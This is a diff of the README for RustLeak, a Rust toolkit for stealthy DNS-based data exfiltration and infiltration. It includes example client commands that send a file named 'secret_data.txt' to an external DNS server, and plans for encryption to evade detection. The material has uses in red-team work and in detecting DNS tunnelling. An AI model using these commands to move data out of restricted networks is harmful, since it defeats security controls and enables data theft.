@@ -1,12 +1,20 @@
 # **RustLeak**
 
 **RustLeak** is a lightweight and stealthy DNS-based data exfiltration and infiltration toolkit, built with Rust. It can be used in a restricted environment. It consists of two main components:
-- **\`rustleak-server\`**: The custom DNS server that processes data through DNS queries.
-- **\`rustleak-client\`**: The client tool to send or receive data using the server.
 
-** IMPORTANT ** 
-You need to setup and host the DNS Server.
-Then change your DNS Provider settings to redirect the DNS traffic to your server.
+- **`rustleak-server`**: The custom DNS server that processes data through DNS queries.
+- **`rustleak-client`**: The client tool to send or receive data using the server.
+
+---
+
+## **Important Notice**
+- You need to set up and host the DNS Server.
+- Update your DNS provider settings to redirect DNS traffic to your server.
+
+**Note**: Actual speed is limited:
+- **Upload**: ~250 Bytes/s
+- **Download**: ~230 Bytes/s
+
 ---
 
 ## **Features**
@@ -17,15 +25,17 @@ Then change your DNS Provider settings to redirect the DNS traffic to your serve
 ---
 
 ## **How It Works**
-- **Exfiltration**: The client (\`rustleak-client\`) sends data embedded in DNS queries to the server (\`rustleak-server\`), which decodes and stores it.
+- **Exfiltration**: The client (`rustleak-client`) sends data embedded in DNS queries to the server (`rustleak-server`), which decodes and stores it.
 - **Infiltration**: The server responds with data embedded in DNS responses, and the client decodes the received data.
 
 ---
 
-## **Possible upgrades**
-- **Single Encryption** : Using encryption in order to increase stealth. ( Restricted host <--> DNS Server)
-- **Dual Encryption** : Using encryption in order to increase stealth. ( Restricted host <--> DNS Server <--> External host)
-- **Record Type rotation**: Actually only TXT records are used to send/receive data.
+## **Possible Upgrades**
+- **Single Encryption**: Encrypt data for stealth (Restricted Host <--> DNS Server).
+- **Dual Encryption**: Encrypt data for full stealth (Restricted Host <--> DNS Server <--> External Host).
+- **Record Type Rotation**: Support additional DNS record types beyond TXT records.
+- **Upload Speed Upgrade**: Transfer more labels in upload queries.
+- **Download Speed Upgrade**: Transfer more data per download query.
 
 ---
 
@@ -69,6 +79,10 @@ rustleak-client send --code <unique_code> --filename <file_to_send> --domain <dn
 rustleak-client send --code test123 --filename secret_data.txt --domain example.com
 \`\`\`
 
+![upload](https://github.com/user-attachments/assets/cb1cfe8d-8ff6-4c0f-a24a-2f25a153ece6)
+
+
+
 #### **Receive Data**
 Use the \`Receive\` command to retrieve data:
 \`\`\`bash
@@ -84,6 +98,9 @@ rustleak-client receive --code <unique_code> --filename <output_file> --domain <
 \`\`\`bash
 rustleak-client receive --code test123 --filename received_data.txt --domain example.com
 \`\`\`
+
+![download](https://github.com/user-attachments/assets/bd13898f-bcdc-4ddf-8241-50bf65275ed4)
+
 
 ---
 
